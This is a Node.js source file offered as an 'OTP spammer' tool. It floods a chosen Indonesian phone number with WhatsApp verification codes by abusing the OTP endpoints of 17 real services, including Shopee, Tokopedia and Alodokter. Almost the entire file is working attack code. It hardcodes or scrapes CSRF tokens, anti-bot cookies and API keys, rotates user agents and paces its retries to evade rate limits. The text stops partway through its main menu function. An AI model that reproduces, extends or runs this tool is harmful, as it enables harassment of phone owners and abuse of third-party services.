/*
 * [ Spam Otp Wa ]
 * creator : H1Dz
 * base    : -
 * channel : https://whatsapp.com/channel/0029Vb82nkLEwEjtLSQ49I44
 * support : follow my channel for more updates
 */

const axios = require('axios');
const { randomUUID, randomInt } = require('crypto');
const readline = require('readline');

const CONFIG = {
  retries: 2,
  timeout: 30000,
  defaultDelayMin: 800,
  defaultDelayMax: 1500
};

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
];

const IP_POOL = [];
for (let i = 0; i < 1000; i++) {
  IP_POOL.push(`${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}`);
}

function randomIP() { return IP_POOL[randomInt(0, IP_POOL.length - 1)]; }
function randomUA() { return USER_AGENTS[randomInt(0, USER_AGENTS.length - 1)]; }

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function randomDelay(min, max) {
  if (min >= max) max = min + 500;
  const ms = randomInt(min, max);
  return delay(ms);
}

function normalizePhone(phone) {
  let p = phone.replace(/[^0-9]/g, "");
  if (p.startsWith("0")) p = "62" + p.slice(1);
  if (!p.startsWith("62")) p = "62" + p;
  return p;
}

function generateEmail() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < 10; i++) {
    result += chars.charAt(randomInt(0, chars.length - 1));
  }
  return `${result}@bwmyga.com`;
}

function showBanner() {
  console.clear();
  console.log('\x1b[36m%s\x1b[0m', '╔═══════════════════════════════════════╗');
  console.log('\x1b[36m%s\x1b[0m', '║        OTP SPAMMER TOOLS v3          ║');
  console.log('\x1b[36m%s\x1b[0m', '╚═══════════════════════════════════════╝');
  console.log('');
}

function showMenu() {
  console.log('\x1b[36m%s\x1b[0m', '  [1] Spam (pilih platform)');
  console.log('\x1b[36m%s\x1b[0m', '  [2] Set Delay');
  console.log('\x1b[31m%s\x1b[0m', '  [3] Exit');
  console.log('');
}

function showLoading(text) {
  const frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
  return new Promise((resolve) => {
    let i = 0;
    const interval = setInterval(() => {
      process.stdout.write(`\r\x1b[36m${frames[i]} ${text}\x1b[0m`);
      i = (i + 1) % frames.length;
    }, 100);
    setTimeout(() => {
      clearInterval(interval);
      process.stdout.write('\r\x1b[32m✓\x1b[0m ' + text + '\n');
      resolve();
    }, 800);
  });
}

const PLATFORMS = {};

let pinhomeCsrfCache = null;
let pinhomeCsrfExpiry = 0;
async function getPinhomeCSRF() {
  const now = Date.now();
  if (pinhomeCsrfCache && (now - pinhomeCsrfExpiry) < 300000) return pinhomeCsrfCache;
  try {
    const resp = await axios.get('https://www.pinhome.id/daftar', {
      headers: { 'User-Agent': randomUA(), 'Accept': 'text/html' },
      timeout: 10000
    });
    let csrfToken = '', cookieString = '';
    const cookies = resp.headers['set-cookie'] || [];
    cookies.forEach(c => {
      const parts = c.split(';');
      const nameValue = parts[0];
      cookieString += nameValue + '; ';
      if (nameValue.includes('_X7kCsrf')) csrfToken = nameValue.split('=')[1];
    });
    if (!csrfToken) {
      const html = resp.data;
      const match = html.match(/"csrfToken":"([^"]+)"/) || html.match(/name="csrf-token" content="([^"]+)"/);
      if (match) csrfToken = match[1];
    }
    if (!csrfToken) {
      csrfToken = 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8';
      cookieString = '_X7kCsrf=' + csrfToken + '; _ga=GA1.1.1752313616.1783394371';
    }
    pinhomeCsrfCache = { csrfToken, cookieString };
    pinhomeCsrfExpiry = now;
    return pinhomeCsrfCache;
  } catch(e) {
    return { csrfToken: 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8', cookieString: '_X7kCsrf=v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8; _ga=GA1.1.1752313616.1783394371' };
  }
}

let shopeeCsrfCache = null, shopeeCookiesCache = null;
async function getShopeeCSRF() {
  try {
    const resp = await axios.get('https://shopee.co.id/buyer/signup', {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0', 'Accept': 'text/html' },
      timeout: 15000
    });
    let csrfToken = '', cookieString = '';
    const cookies = resp.headers['set-cookie'] || [];
    cookies.forEach(c => {
      const parts = c.split(';');
      const nameValue = parts[0];
      cookieString += nameValue + '; ';
      if (nameValue.includes('csrftoken')) csrfToken = nameValue.split('=')[1];
    });
    if (!csrfToken) {
      const html = resp.data;
      const match = html.match(/name="csrf_token" value="([^"]+)"/) || html.match(/csrfToken:"([^"]+)"/);
      if (match) csrfToken = match[1];
    }
    if (!csrfToken) {
      csrfToken = 'CORLrRZovc42RwJ4SbNxsObQMAv3LUMd';
      cookieString = 'csrftoken=CORLrRZovc42RwJ4SbNxsObQMAv3LUMd; SPC_SI=7LwqagAAAABYSm5vblNYaKGTKgEAAAAANExuVjR6N0s=; SPC_R_T_ID=LZxgPUCbgqZuZFJ6/yPLMfYc9WchwwtwVhIzj5vvb2o1qA7NEFrp1LpUW7SNPcT7HrEGZtuCXHbZpza4XVnzpcJY4deTBl3uYnKu2OzPAYp2BOQ7HT4J6aRccVm2Bar6vwAN91qvq2yT6OUCbP9QdzFlsbe23Jm/tLXvl0dLGyo=; SPC_R_T_IV=dlh2U0JxckNDTGpaWFJNaQ==; SPC_T_ID=LZxgPUCbgqZuZFJ6/yPLMfYc9WchwwtwVhIzj5vvb2o1qA7NEFrp1LpUW7SNPcT7HrEGZtuCXHbZpza4XVnzpcJY4deTBl3uYnKu2OzPAYp2BOQ7HT4J6aRccVm2Bar6vwAN91qvq2yT6OUCbP9QdzFlsbe23Jm/tLXvl0dLGyo=; SPC_T_IV=dlh2U0JxckNDTGpaWFJNaQ==';
    }
    shopeeCsrfCache = csrfToken;
    shopeeCookiesCache = cookieString;
    return { csrfToken, cookieString };
  } catch(e) {
    return { csrfToken: 'CORLrRZovc42RwJ4SbNxsObQMAv3LUMd', cookieString: 'csrftoken=CORLrRZovc42RwJ4SbNxsObQMAv3LUMd; SPC_SI=7LwqagAAAABYSm5vblNYaKGTKgEAAAAANExuVjR6N0s=; SPC_R_T_ID=LZxgPUCbgqZuZFJ6/yPLMfYc9WchwwtwVhIzj5vvb2o1qA7NEFrp1LpUW7SNPcT7HrEGZtuCXHbZpza4XVnzpcJY4deTBl3uYnKu2OzPAYp2BOQ7HT4J6aRccVm2Bar6vwAN91qvq2yT6OUCbP9QdzFlsbe23Jm/tLXvl0dLGyo=; SPC_R_T_IV=dlh2U0JxckNDTGpaWFJNaQ==; SPC_T_ID=LZxgPUCbgqZuZFJ6/yPLMfYc9WchwwtwVhIzj5vvb2o1qA7NEFrp1LpUW7SNPcT7HrEGZtuCXHbZpza4XVnzpcJY4deTBl3uYnKu2OzPAYp2BOQ7HT4J6aRccVm2Bar6vwAN91qvq2yT6OUCbP9QdzFlsbe23Jm/tLXvl0dLGyo=; SPC_T_IV=dlh2U0JxckNDTGpaWFJNaQ==' };
  }
}

let tokopediaCookiesCache = null;
async function getTokopediaCookies() {
  try {
    const resp = await axios.get('https://www.tokopedia.com/register', {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0', 'Accept': 'text/html' },
      timeout: 15000
    });
    let cookieString = '';
    const cookies = resp.headers['set-cookie'] || [];
    cookies.forEach(c => { const parts = c.split(';'); cookieString += parts[0] + '; '; });
    if (!cookieString) {
      cookieString = '_abck=70C5248D6B2855826E6F29673998C25C~0~YAAQx1A7FwGyEUGfAQAA+IO2SBCTpvGkMWyu9MYiMpBNGGxwZmWxHy8iqA6+T26ENQmyV7gffOyy057esEYjT/yQ0L2tcZfsBrpj9g5CfBY/JbA63L4Hadne4BHc5s3bpeWb8lnjjqw24oq3KPQr4KbrygrGG20u7ZxbAHE1DlKUoj6o4fL470f6LDEHvdINLMtAghej5KdsEkUtZaXz8dK+wJuHsySO758bn4Rj2EMvnHjwGHr8P1DmxI2jD5Yq1Ed/A06LurJ1u1AcTDvF7Fakw+79/H8AFAE9RdchDOQ4YiCZc3DOdJ7O0XjLyEv4yJiZQdyIypIdepcwiBwq3hG1r5cq7uduvGvEyLd7I/RJ52BCVWQU5GEcQ6jpJIiKfRUcSSXEQcVlu0X05HtDwsUg17FFHIrgSqEJtbabEFNgu45vjAUscNFcLIBWChdvFUOuS9cglAf/dbdWDqUun0yqV1XL5DbufOnGOobMzCEDWn3nGLaUDULnHMGYB5La8p+NmE/SWXAdrKEMQ6cpIXHLrxwi4DPrZd+EkjjWNURbxHUFppEuA4eJlPbmZlO1rJQOpdVXukmer2NqHDY+9ItzxFOnyw+iLY8w6XNCuK4uCRYnLVJBjYhHa9XDW3+a2DL/fo5oH0y+zT0CdYObO52Sliq3xlXbFncGx0CwjRYkhdDPdc57dOKc2N90P0Ty81Bi2zb1FSzwBVzEApAbPTqMYb8uJO1fcK+BtjvGOoHufEq16P4rOPTV4Ddu14sjXCvgEROykUL4nc82J9bPMWBTcRgl1KdV+jUuaD+QC4KXa0fi2mbTwtQ7Ja2LU63lhhyKM60QQBmtJ4ePKQ63Ob9/bRO09~-1~-1~-1~AAQAAAAF/////14hbTOzqX3jtJFGA/a7yryiDzLmb/Ry760cYtOHAdZWExxmUUZyruR+uN6M11o6DleIbV+V4DNGhJSVRzX+nsbljfTQs5EDhixc~-1; bm_sv=A97C32115322F2AD694ED2D5F833B51D~YAAQx1A7F42yEUGfAQAAgJu2SABTw65qm/hSmjADN8AoECbYe7doRoh6NIzfLtbkOdy/YjneYqyaJvL2BwqUUwTTBnp7NR4e7osmcZBk3qEFwc46LAM0dB55YVGgOLzDuW/uk2QfXn6zNbIsP2gNNC5r8zzQqKU3D5zI5Afan0YMF8JJ7r93JL0BMiuwCz9fpsHOCLpyy3grLm7j5G3KkHwD1vtj+22B1S+aK9ARqePFxf8d+W/xEzoKleUl0x8BgXqT~1';
    }
    tokopediaCookiesCache = cookieString;
    return cookieString;
  } catch(e) {
    return '_abck=70C5248D6B2855826E6F29673998C25C~0~YAAQx1A7FwGyEUGfAQAA+IO2SBCTpvGkMWyu9MYiMpBNGGxwZmWxHy8iqA6+T26ENQmyV7gffOyy057esEYjT/yQ0L2tcZfsBrpj9g5CfBY/JbA63L4Hadne4BHc5s3bpeWb8lnjjqw24oq3KPQr4KbrygrGG20u7ZxbAHE1DlKUoj6o4fL470f6LDEHvdINLMtAghej5KdsEkUtZaXz8dK+wJuHsySO758bn4Rj2EMvnHjwGHr8P1DmxI2jD5Yq1Ed/A06LurJ1u1AcTDvF7Fakw+79/H8AFAE9RdchDOQ4YiCZc3DOdJ7O0XjLyEv4yJiZQdyIypIdepcwiBwq3hG1r5cq7uduvGvEyLd7I/RJ52BCVWQU5GEcQ6jpJIiKfRUcSSXEQcVlu0X05HtDwsUg17FFHIrgSqEJtbabEFNgu45vjAUscNFcLIBWChdvFUOuS9cglAf/dbdWDqUun0yqV1XL5DbufOnGOobMzCEDWn3nGLaUDULnHMGYB5La8p+NmE/SWXAdrKEMQ6cpIXHLrxwi4DPrZd+EkjjWNURbxHUFppEuA4eJlPbmZlO1rJQOpdVXukmer2NqHDY+9ItzxFOnyw+iLY8w6XNCuK4uCRYnLVJBjYhHa9XDW3+a2DL/fo5oH0y+zT0CdYObO52Sliq3xlXbFncGx0CwjRYkhdDPdc57dOKc2N90P0Ty81Bi2zb1FSzwBVzEApAbPTqMYb8uJO1fcK+BtjvGOoHufEq16P4rOPTV4Ddu14sjXCvgEROykUL4nc82J9bPMWBTcRgl1KdV+jUuaD+QC4KXa0fi2mbTwtQ7Ja2LU63lhhyKM60QQBmtJ4ePKQ63Ob9/bRO09~-1~-1~-1~AAQAAAAF/////14hbTOzqX3jtJFGA/a7yryiDzLmb/Ry760cYtOHAdZWExxmUUZyruR+uN6M11o6DleIbV+V4DNGhJSVRzX+nsbljfTQs5EDhixc~-1; bm_sv=A97C32115322F2AD694ED2D5F833B51D~YAAQx1A7F42yEUGfAQAAgJu2SABTw65qm/hSmjADN8AoECbYe7doRoh6NIzfLtbkOdy/YjneYqyaJvL2BwqUUwTTBnp7NR4e7osmcZBk3qEFwc46LAM0dB55YVGgOLzDuW/uk2QfXn6zNbIsP2gNNC5r8zzQqKU3D5zI5Afan0YMF8JJ7r93JL0BMiuwCz9fpsHOCLpyy3grLm7j5G3KkHwD1vtj+22B1S+aK9ARqePFxf8d+W/xEzoKleUl0x8BgXqT~1';
  }
}

async function sendRequest(endpoint, delayMin, delayMax) {
  const headers = {
    "Content-Type": "application/json",
    "User-Agent": randomUA(),
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8",
    "Connection": "keep-alive",
    ...(endpoint.headers || {})
  };

  if (endpoint.url.includes('api.maulagi.id') || endpoint.url.includes('matahari-backend-prod.matahari.com')) {
    delete headers['X-Forwarded-For'];
    delete headers['X-Real-IP'];
    headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0';
  }

  if (endpoint.url.includes('fastwork.id')) {
    await randomDelay(30000, 45000);
  } else {
    await randomDelay(delayMin, delayMax);
  }

  for (let attempt = 0; attempt <= CONFIG.retries; attempt++) {
    try {
      const config = { headers, timeout: CONFIG.timeout, httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false }) };
      let resp = endpoint.method === "GET" ? await axios.get(endpoint.url, config) : await axios.post(endpoint.url, endpoint.data, config);
      let responseBody = {};
      try { responseBody = resp.data; } catch(e) {}

      if ([200, 201, 202, 204].includes(resp.status)) return true;
      if (responseBody && (
        responseBody.success === true || responseBody.status === true || responseBody.status === "success" ||
        responseBody.statusCode === 200 || responseBody.status === 202 || responseBody.is_success === true ||
        responseBody.message === "OTP terkirim" || responseBody.message === "OTP sent successfully" || responseBody.message === "Success." ||
        responseBody.error === 0 ||
        (responseBody.data && responseBody.data.OTPRequest && responseBody.data.OTPRequest.success === true) ||
        (responseBody.data && (responseBody.data.otp === "processed" || responseBody.data.new_uuid || responseBody.data.status === 1)) ||
        responseBody.secretCode
      )) return true;

      if (resp.status === 429) {
        let retryAfter = 30;
        try { if (responseBody && responseBody.retry_after) retryAfter = parseInt(responseBody.retry_after) || 30; } catch(e) {}
        await delay(retryAfter * 1000 + randomInt(0, 5000));
        continue;
      }
      if (attempt < CONFIG.retries) { await delay(3000 + randomInt(0, 2000)); continue; }
    } catch (e) {
      if (attempt < CONFIG.retries) { await delay(3000 + randomInt(0, 2000)); continue; }
    }
  }
  return false;
}

async function getEndpoints(phone, platforms) {
  const p08 = "0" + phone.slice(2);
  const p62 = phone;
  const pNoCountry = phone.replace("62", "");
  const deviceId = randomUUID();
  const requestId = randomUUID();
  const email = generateEmail();
  const csrfData = await getPinhomeCSRF();
  const shopeeData = await getShopeeCSRF();
  const tokopediaCookies = await getTokopediaCookies();

  const allEndpoints = {
    maulagi: [{ url: "https://api.maulagi.id/api/v2/auth/check", data: { credentials: p08 }, headers: { "X-ML-KEY": "D25KHUXZ25", "Origin": "https://maulagi.id", "Referer": "https://maulagi.id/" } }],
    matahari: [{ url: "https://matahari-backend-prod.matahari.com/api/auth/re-activation", data: { mobileCountryCode: "", mobileNumber: p08, activationCode: "" }, headers: { "Origin": "https://matahari.com", "Referer": "https://matahari.com/" } }],
    pinhome: [{ url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: pNoCountry }, headers: { "x-csrf-token": csrfData.csrfToken, "Cookie": csrfData.cookieString, "Origin": "https://www.pinhome.id", "Referer": "https://www.pinhome.id/daftar" } }],
    bonusbelanja: [{ url: "https://www.bonusbelanja.com/api/auth/registration/app", data: { phone: p62, name: "User", agreeTnc: true, agreeContact: false } }],
    alodokter: [{ url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: randomUUID() }, request_via: "whatsapp" } }],
    beautyhaul: [{ url: "https://www.beautyhaul.com/ajax/account/send_otp", data: { method: "WhatsApp", phone: p62 } }],
    gritero: [{ url: "https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id", data: { nama_lengkap: "User", telepon: p08, email: `user${randomInt(1000,9999)}@mail.com` }, headers: { "Xid": String(randomInt(1000000, 9999999)), "source": "ocistok" } }],
    duniagames: [{ url: "https://api.duniagames.co.id/api/other/api/v1/content/", data: null, method: "GET", headers: { "Accept-Language": "id", "x-device": deviceId, "Ciam-Type": "FR" } }],
    internetrakyat: [{ url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "280999!FTTH", "Origin": "https://internetrakyat.id", "Referer": "https://internetrakyat.id/auth/register" } }],
    dokterin: [{ url: "https://api.dokterin.id/user/v1/users/login", data: { phone: p62, tnc_accept: true, device_id: randomUUID() }, headers: { "Origin": "https://dokterin.id", "Referer": "https://dokterin.id/login" } }],
    paper: [{ url: "https://api.paper.id/api/v1/auth/login", data: { method: "whatsapp", phone: p08 }, headers: { "Origin": "https://www.paper.id", "Referer": "https://www.paper.id/", "x-paper-user-agent": "Jupiter/7.19.5 desktop (windows) Firefox 152", "request-id": requestId } }],
    indodax: [{ url: "https://api.indodax.com/api/v1/otp/send", data: { email: email, flow: "register", method: "whatsapp", old_uuid: "" }, headers: { "Origin": "https://indodax.com", "Referer": "https://indodax.com/", "key": "bAGUG2WiLy", "authorization": "Bearer bAGUG2WiLy" } }],
    bunda: [{ url: "https://cms.bunda.co.id/api/v1/auth/send-otp", data: { phone_number: p62, type: "auth" }, headers: { "Origin": "https://www.bunda.co.id", "Referer": "https://www.bunda.co.id/id", "X-Requested-With": "XMLHttpRequest", "X-Locale": "id" } }],
    fastwork: [{ url: "https://api.fastwork.id/auth/v2/signup.sendVerificationCode", data: { phone_number: p08 } }],
    saturdays: [
      { url: "https://saturdays.com/api/v1/auth/otp", data: { phone: p62, type: "register" } },
      { url: "https://api.saturdays.com/v2/user/otp/request", data: { phoneNumber: p62, channel: "whatsapp" } }
    ],
    shopee: [{ url: "https://shopee.co.id/api/v4/otp/send_vcode", data: { captcha_id: "", captcha_signature: "17f42da63155c8c343dab137a841c8febd065d5fb32409f7581f43871a349aa7e0411eeeeace1937d83a609fe7f54f504beb412eabd213bb8a12754d551d34c1c9474e4acc04ff863e1cdc35498d3c50e08c2187cb9f67ec7d418e8e1a54ec0dd247fcf9a48f7e7bb4bddf40e3b06ef0b007e005cfeb27181333327973d3c8a18097d046ebe2a12309bf337696c5a4dd59ccf4e8862e5fbc5aeee8c7894fe2e687515c2d5aac97f28732f545ebcc47323b8e0f94cc545eb6e9e867a325a71d8ec8dff4ac1156cb54625e6785101c7387d4d89fc57fd00020f5ede8e5a20212deb2335011f615d884b04631c01aa9ab4bbcf108ba7f39a3c75f5d6953abbef66de6a6bb7baf35d50de15ddafc25224b1878d7bee5e92e2625c8c41b52b6d5e66aa9e5e924827011a1b99faa807c324224cc3ad7cf303a35e4e0fb0cda6ecd0a23e2c79100485ec417b63228505e448aff83d5974ca023d38de219050ea867683f0c06b8792d366775823bb7b4f3573672ed51153399dd6500231fbfd7a0358e10a1ab573c9d16b42f577aa1fc728a54f8df52ec7f81558c47d2700e282f4b95dd11dc2cb6c76bc585c7120a980c6b05438c41354e2512869042fbfac956624667c165b518af63b3d5f51ee9da9f326f37a4002c879f7ae707a70c26fa7a202e8156841bc8658c932a44ffe2b51d02b029161a2449ff9e6ab81175bfb1db34a", channel: 3, client_identifier: { client_id: randomUUID() }, security_device_fingerprint: "n+U7x1zFU8+6VDDjJl+UeA==|SZfO1GqUvHMvbbpkqPDIWImWI1A5RqRnWgXjMz7lPSR56kCfGDBG1TPTS3F0PH7sRRld5qqF/a0=|rK4cK14kBGDvypv7|08|3", force_channel: true, m_token: "", operation: 8, phone: p62, support_session: true, supported_channels: [1, 2, 3, 6, 0, 5] }, headers: { "Accept": "application/json", "af-ac-enc-dat": "4b695d8c227609cb", "af-ac-enc-sz-token": "n+U7x1zFU8+6VDDjJl+UeA==|SZfO1GqUvHMvbbpkqPDIWImWI1A5RqRnWgXjMz7lPSR56kCfGDBG1TPTS3F0PH7sRRld5qqF/a0=|rK4cK14kBGDvypv7|08|3", "Cookie": shopeeData.cookieString, "Origin": "https://shopee.co.id", "Referer": "https://shopee.co.id/buyer/signup?fu_tracking_id=7369607ab38-c4eb-475e-829b-2bc92f46c252&next=https%3A%2F%2Fshopee.co.id%2F", "X-API-SOURCE": "pc", "X-CSRFToken": shopeeData.csrfToken, "X-Requested-With": "XMLHttpRequest", "x-sap-ri": "8c06506af5873b44f1e58a350a015f45135a8fc90f5c1cfda7a3", "x-sap-sec": "Gw7fULouCALMllBLukqKhbA+viSvRdlAdFTCWPUlvYG7agonnbYNrHRM8+E/qbrQD7lAM6TzR4SCsqG0dAZlYjEKroe8TV+vD2lFJbXXRIkGEotYdF3ybjhGk3MiT6w/DSCAcawwQJaGP0aTX1T6azlFLQuXl8DMrilfPcdQDYUaN+rbTzxsuJBtAxppyTJ9HBJuY1gmUrNqKDPYV1zHjmgm5NvGYijhqdRB0Uub/0MfFSSS6iWwSnFbHORZME10oUiKpq7emBRinHE4pL2j7clqTTsyS27NZYkCnvl8icqVzTcmAwAYYVhPrXmPqk66feql2luixZd4saU1WF1TIbwr9h5a8YPlb8Jjo4Db6S7qJHT45NKzXSZPyKSKmV2eapA06YicXafkd71mKgaayen5/gpFTsvUfSEiOgDI/IKJP9uWDOkOzHUe9haF/ceFQ9q7u1XqO6uTEAlYt76r4Vs30pwOxuNKhA6Df8REvIpIwQ6hCnO8GTv2Or41vHg+DqHc+NtGVByTkVEr01SFm9ScfXBBCQ6s0yRFQNpVKuRYrFPCoYHSiABa7iqSbZ3m3xpJNU9NSKxWQFgV7yF8S0b1tg+8QUf+6Uv8TuZ9qJoa6cWGEbNJaVFSxs6KK8xNeL1a6nYs02afN6x4/fYC1hKZJObV2BT7YroB6XI1O4sgcU5LZx/33TJn0h5R4kH9oG0NiND+18J9r09S8QUQk3LwJ0HTgULEoJpMIoWCJL83uXSXJ9+6ouG+uJLq+icwoXkFvz4kFOtr955fvzCBqTV1z5vom502iQTrx62I9UhcFOGKIao46cpYwmaF5SfzK78kG8B+14ceKUp7c3ymSbq+HVUOp2mnPGBgc1+tw6GbV4XpM/1/0gwVkSHOiiQKj7wdGLcKki7FSOP13Mn18YCxpAAnGpHasbKlU89Re/+/2RclZkX/3zuOiy487mLanN+cvA+oTlXc87k/iEsrm2xStZvsGP8B6NvUhIoWE7boRbQSt+Jqc7iF4rZI2O=", "X-Shopee-Language": "id", "x-sz-sdk-version": "1.12.40" } }],
    tokopedia: [{ url: "https://gql.tokopedia.com/graphql/OTPRequest", data: { operationName: "OTPRequest", query: `query OTPRequest($otpType: String!, $mode: String, $msisdn: String, $email: String, $otpDigit: Int, $ValidateToken: String, $UserIDEnc: String, $UserIDSigned: String, $Signature: String, $MsisdnEnc: String, $EmailEnc: String, $source: String) { OTPRequest: OTPRequestV2(otpType: $otpType, mode: $mode, msisdn: $msisdn, email: $email, otpDigit: $otpDigit, ValidateToken: $ValidateToken, UserIDEnc: $UserIDEnc, UserIDSigned: $UserIDSigned, Signature: $Signature, MsisdnEnc: $MsisdnEnc, EmailEnc: $EmailEnc, source: $source) { success message errorMessage sse_session_id list_device_receiver error_code message_title message_sub_title message_img_link __typename } }`, variables: { EmailEnc: "", mode: "whatsapp", msisdn: p62, MsisdnEnc: "", otpDigit: 6, otpType: "116" } }, headers: { "Cookie": tokopediaCookies, "Origin": "https://www.tokopedia.com", "Referer": "https://www.tokopedia.com/register", "x-source": "tokopedia-lite", "x-tkpd-akamai": "otp", "x-tkpd-lite-service": "oauth", "x-version": "04f884c" } }]
  };

  let result = [];
  for (const p of platforms) {
    if (allEndpoints[p]) result = result.concat(allEndpoints[p]);
  }
  return result;
}

async function spam(phoneNumber, platforms, count, delayMin, delayMax) {
  const phone = normalizePhone(phoneNumber);
  console.log(`\n📱 Target: ${phone}`);
  console.log(`📋 Platforms: ${platforms.join(', ')}`);
  console.log(`🔄 Count: ${count}x\n`);

  let totalSuccess = 0, totalFailed = 0;
  const start = Date.now();

  for (let round = 0; round < count; round++) {
    if (count > 1) console.log(`\n🔄 Round ${round + 1}/${count}`);
    const endpoints = await getEndpoints(phone, platforms);
    
    for (let i = 0; i < endpoints.length; i++) {
      const hostname = new URL(endpoints[i].url).hostname;
      process.stdout.write(`[${String(i+1).padStart(2)}] ${hostname}... `);
      const result = await sendRequest(endpoints[i], delayMin, delayMax);
      if (result) { totalSuccess++; console.log('\x1b[32m✅\x1b[0m'); } 
      else { totalFailed++; console.log('\x1b[31m❌\x1b[0m'); }
      if (i < endpoints.length - 1) await randomDelay(delayMin, delayMax);
    }
    if (round < count - 1) await randomDelay(delayMin * 2, delayMax * 2);
  }

  const elapsed = ((Date.now() - start) / 1000).toFixed(1);
  console.log('\n' + '═'.repeat(40));
  console.log(`✅ Success: ${totalSuccess}`);
  console.log(`❌ Failed: ${totalFailed}`);
  console.log(`⏱️ Time: ${elapsed}s`);
  console.log('═'.repeat(40) + '\n');
}

function createInterface() { return readline.createInterface({ input: process.stdin, output: process.stdout }); }
function askQuestion(rl, q) { return new Promise(resolve => rl.question(q, resolve)); }

async function main() {
  let customDelayMin = CONFIG.defaultDelayMin;
  let customDelayMax = CONFIG.defaultDelayMax;

  while (true) {
    showBanner();
    showMenu();
    const rl = createInterface();
    const choice = await askQuestion(rl, '\x1b[36mPilih: \x1b[0m');
    rl.close();

    if (choice === '1') {
      const rl2 = createInterface();
      const phone = await askQuestion(rl2, '\x1b[36mNomor: \x1b[0m');
      rl2.close();
      if (!phone || phone.length < 10) { console.log('\x1b[31m❌ Invalid!\x1b[0m'); await delay(1500); continue; }

      const platformList = [
        'maulagi', 'matahari', 'pinhome', 'bonusbelanja', 'alodokter',
        'beautyhaul', 'gritero', 'duniagames', 'internetrakyat', 'dokterin',
        'paper', 'indodax', 'bunda', 'fastwork', 'saturdays', 'shopee', 'tokopedia'
      ];

      console.log('\n\x1b[36mPilih platform (pisah dengan koma):\x1b[0m');
      console.log(' 1.maulagi  2.matahari  3.pinhome  4.bonusbelanja  5.alodokter');
      console.log(' 6.beautyhaul  7.gritero  8.duniagames  9.internetrakyat  10.dokterin');
      console.log(' 11.paper  12.indodax  13.bunda  14.fastwork  15.saturdays');
      console.log(' 16.shopee  17.tokopedia');
      console.log(' \x1b[33mContoh: 1,2,3,16,17 (untuk maulagi,matahari,pinhome,shopee,tokopedia)\x1b[0m');
      console.log(' \x1b[33mAtau ketik "all" untuk semua platform\x1b[0m');

      const rl3 = createInterface();
      const input = await askQuestion(rl3, '\x1b[36mPlatform: \x1b[0m');
      rl3.close();

      let selected = [];
      if (input.toLowerCase() === 'all') {
        selected = platformList;
      } else {
        const nums = input.split(',').map(s => s.trim());
        for (const n of nums) {
          const idx = parseInt(n) - 1;
          if (idx >= 0 && idx < platformList.length) selected.push(platformList[idx]);
        }
      }
      if (selected.length === 0) { console.log('\x1b[31m❌ No platform selected!\x1b[0m'); await delay(1500); continue; }

      const rl4 = createInterface();
      const countInput = await askQuestion(rl4, '\x1b[36mJumlah spam (default 1): \x1b[0m');
      rl4.close();
      const count = parseInt(countInput) || 1;

      console.log('\n\x1b[33m📋 Konfigurasi:\x1b[0m');
      console.log(`   📱 ${phone}`);
      console.log(`   📋 ${selected.length} platform: ${selected.join(', ')}`);
      console.log(`   🔄 ${count}x`);
      console.log(`   ⏱️ ${customDelayMin/1000}-${customDelayMax/1000}s`);

      const rl5 = createInterface();
